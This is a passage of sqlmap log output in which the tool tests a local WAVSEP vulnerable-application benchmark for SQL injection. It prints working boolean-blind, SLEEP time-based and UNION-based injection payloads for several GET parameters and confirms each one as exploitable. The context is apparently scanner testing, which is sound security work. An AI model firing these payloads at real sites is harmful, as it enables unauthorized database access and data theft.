[04:44:44] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:44:44] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:44:44] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:44:44] [INFO] checking if the injection point on GET parameter 'msg' is a false positive
GET parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 361 HTTP(s) requests:
---
Parameter: msg (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msg=textvalue' WHERE 1493=1493 AND 4585=(SELECT (CASE WHEN (4585=4585) THEN 4585 ELSE (SELECT 2587 UNION SELECT 8929) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=textvalue' WHERE 2562=2562 AND (SELECT 1050 FROM (SELECT(SLEEP(5)))Fqxk)-- hGcR
---
do you want to exploit this SQL injection? [Y/n] Y
[04:44:44] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[5/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=msgid
do you want to test this URL? [Y/n/q]
> Y
[04:44:44] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=msgid'                                                                          
[04:44:44] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=8DD3C65EAE3...DCA1969801'). Do you want to use those [Y/n] Y
[04:44:44] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:44:44] [INFO] testing if the target URL content is stable
[04:44:44] [INFO] target URL content is stable
[04:44:44] [INFO] testing if GET parameter 'orderby' is dynamic
[04:44:44] [INFO] GET parameter 'orderby' appears to be dynamic
[04:44:44] [WARNING] heuristic (basic) test shows that GET parameter 'orderby' might not be injectable
[04:44:44] [INFO] testing for SQL injection on GET parameter 'orderby'
[04:44:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:44:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:44:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:44:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:44:46] [INFO] GET parameter 'orderby' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --string="web")
[04:44:46] [INFO] testing 'Generic inline queries'
[04:44:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:44:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:44:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:44:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:44:46] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:44:46] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:44:46] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:44:46] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:44:46] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:46] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:46] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:46] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:46] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:46] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:46] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:46] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:44:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:44:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:44:46] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:44:46] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:44:46] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:44:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:44:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:44:46] [INFO] testing 'MySQL inline queries'
[04:44:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:44:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:44:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:44:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:44:46] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:44:46] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:44:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:44:56] [INFO] GET parameter 'orderby' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:44:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:44:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:44:56] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:44:56] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:44:56] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:44:56] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:44:56] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:44:57] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:44:57] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:44:57] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:44:57] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:44:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:44:58] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:44:58] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:44:58] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:44:58] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:44:59] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:44:59] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:44:59] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:44:59] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:44:59] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:44:59] [INFO] checking if the injection point on GET parameter 'orderby' is a false positive
GET parameter 'orderby' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 811 HTTP(s) requests:
---
Parameter: orderby (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: orderby=msgid AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 1939 UNION SELECT 2380) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: orderby=msgid AND (SELECT 2624 FROM (SELECT(SLEEP(5)))jChv)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:44:59] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[6/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp?transactionId=132
do you want to test this URL? [Y/n/q]
> Y
[04:45:00] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp?transactionId=132'                                                                                          
[04:45:00] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=D3393F5556E...A1513DEDD2'). Do you want to use those [Y/n] Y
[04:45:00] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:45:00] [INFO] testing if the target URL content is stable
[04:45:00] [INFO] target URL content is stable
[04:45:00] [INFO] testing if GET parameter 'transactionId' is dynamic
[04:45:00] [INFO] GET parameter 'transactionId' appears to be dynamic
[04:45:00] [INFO] heuristic (basic) test shows that GET parameter 'transactionId' might be injectable
[04:45:00] [INFO] testing for SQL injection on GET parameter 'transactionId'
[04:45:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:45:01] [INFO] GET parameter 'transactionId' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="132")
[04:45:01] [INFO] testing 'Generic inline queries'
[04:45:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:45:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:45:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:45:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:45:01] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:45:01] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:45:01] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:45:01] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:45:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:01] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:01] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:01] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:01] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:01] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:01] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:01] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:45:01] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:45:01] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:45:01] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:45:01] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:45:01] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:45:01] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:45:01] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:45:01] [INFO] testing 'MySQL inline queries'
[04:45:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:45:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:45:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:45:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:45:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:45:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:45:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:45:11] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:45:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:45:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:45:11] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:45:11] [INFO] target URL appears to have 4 columns in query
[04:45:11] [INFO] GET parameter 'transactionId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: transactionId=132 AND 6120=6120

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=132 AND (SELECT 5775 FROM (SELECT(SLEEP(5)))CbJN)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionId=132 UNION ALL SELECT NULL,NULL,CONCAT(0x7176767171,0x666c6b6146667747544153586578616d65426979566867665a6e6c5162596e5274706c666e62534c,0x7170626271),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:45:11] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[7/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp?msgId=1
do you want to test this URL? [Y/n/q]
> Y
[04:45:11] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp?msgId=1'                                                                                                      
[04:45:11] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=83924AE1EC9...C683E3991E'). Do you want to use those [Y/n] Y
[04:45:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:45:11] [INFO] testing if the target URL content is stable
[04:45:12] [INFO] target URL content is stable
[04:45:12] [INFO] testing if GET parameter 'msgId' is dynamic
[04:45:12] [INFO] GET parameter 'msgId' appears to be dynamic
[04:45:12] [INFO] heuristic (basic) test shows that GET parameter 'msgId' might be injectable
[04:45:12] [INFO] testing for SQL injection on GET parameter 'msgId'
[04:45:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:45:12] [INFO] GET parameter 'msgId' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="web")
[04:45:12] [INFO] testing 'Generic inline queries'
[04:45:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:45:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:45:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:45:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:45:12] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:45:12] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:45:12] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:45:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:45:12] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:12] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:12] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:12] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:12] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:12] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:12] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:12] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:45:12] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:45:12] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:45:12] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:45:12] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:45:12] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:45:12] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:45:12] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:45:12] [INFO] testing 'MySQL inline queries'
[04:45:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:45:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:45:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:45:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:45:12] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:45:12] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:45:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:45:22] [INFO] GET parameter 'msgId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:45:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:45:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:45:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:45:22] [INFO] target URL appears to have 3 columns in query
[04:45:22] [INFO] GET parameter 'msgId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'msgId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: msgId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: msgId=1 AND 8583=8583

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgId=1 AND (SELECT 2635 FROM (SELECT(SLEEP(5)))Qjsl)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msgId=1 UNION ALL SELECT NULL,CONCAT(0x7171766b71,0x68454f566c734a7270764f64615263624d567862754d7a6e754b535177714b77776477444a7a4478,0x7162787671),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:45:22] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[8/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=10000
do you want to test this URL? [Y/n/q]
> Y
[04:45:22] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=10000'                                                                                            
[04:45:22] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=2D8D2708720...F513608D24'). Do you want to use those [Y/n] Y
[04:45:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:45:22] [INFO] testing if the target URL content is stable
[04:45:23] [INFO] target URL content is stable
[04:45:23] [INFO] testing if GET parameter 'minBalanace' is dynamic
[04:45:23] [WARNING] GET parameter 'minBalanace' does not appear to be dynamic
[04:45:23] [WARNING] heuristic (basic) test shows that GET parameter 'minBalanace' might not be injectable
[04:45:23] [INFO] testing for SQL injection on GET parameter 'minBalanace'
[04:45:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:45:23] [INFO] GET parameter 'minBalanace' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[04:45:23] [INFO] testing 'Generic inline queries'
[04:45:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:45:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:45:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:45:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:45:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:45:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:45:23] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:45:23] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:45:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:23] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:23] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:23] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:23] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:45:23] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:45:23] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:45:23] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:45:23] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:45:23] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:45:23] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:45:23] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:45:23] [INFO] testing 'MySQL inline queries'
[04:45:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:45:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:45:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:45:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:45:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:45:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:45:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:45:33] [INFO] GET parameter 'minBalanace' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:45:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:45:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:45:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:45:33] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:45:33] [INFO] target URL appears to be UNION injectable with 1 columns
[04:45:33] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:45:33] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:45:33] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:45:33] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:45:33] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:45:34] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:45:34] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:45:34] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:45:34] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:45:34] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:45:34] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:45:34] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:45:34] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:45:35] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:45:35] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:45:35] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:45:35] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:45:35] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:45:35] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
